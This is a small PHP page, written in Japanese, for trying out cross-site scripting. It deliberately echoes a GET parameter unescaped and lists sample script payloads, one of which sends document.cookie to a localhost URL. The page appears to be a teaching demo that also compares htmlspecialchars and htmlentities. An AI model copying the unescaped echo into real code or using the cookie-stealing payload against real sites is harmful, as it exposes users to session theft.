<?php
session_start();
?>
<html>
<head>
<title>クロスサイトスクリプティング確認フォーム</title>
</head>
<body>
<h1>クロスサイトスクリプティング確認フォーム</h1>
<h2>■攻撃コード入力フォーム</h2>
<form method="get">
<input type="text" name="atk"></input>
<input type="submit"></input>
</form>
--------<br />
実行コード表示<br />
--------<br />
<?php echo htmlspecialchars($_GET['atk']); ?><br />
--------<br />
実行内容<br />
--------<br />
<?php echo $_GET['atk']; ?><br />
--------------------------------<br />
<h2>■攻撃コード サンプル</h2>
１．alret()が実行できるか確認する<br />
<?php echo htmlspecialchars("<script>alert('test');</script>"); ?><br />
２．alert()にcookieを表示する<br />
<?php echo htmlspecialchars("<script>alert(document.cookie);</script>"); ?><br />
３．画面遷移＋奪取したcookieをパラメータに付加する<br />
<?php echo htmlspecialchars("<script>window.open('http://localhost/?cookie='+document.cookie);</script>"); ?><br />
--------------------------------<br />
<h2>■PHPエスケープ確認（エスケープ結果はソースを確認する）</h2>
<?php
$txt = "「&」「\"」「'」「<」「>」「©」「≠」「→」「⇔」";
echo "変換元<br />\n";
echo "「&」「\"」「'」「<」「>」「©」「≠」「→」「⇔」<br />\n";
echo "htmlspecialchars()<br />\n";
echo htmlspecialchars($txt, ENT_QUOTES);
echo "<br />\nhtmlentities()<br />\n";
echo htmlentities($txt, ENT_QUOTES);
?><br />
※ htmlentitiesの方がエスケープする文字は多い<br />
※ 両方ともシングルクォートはエスケープされないため第二引数に「ENT_QUOTES」を付ける<br />
--------------------------------<br />
<br />
<br />
<br />
</body>
</html>
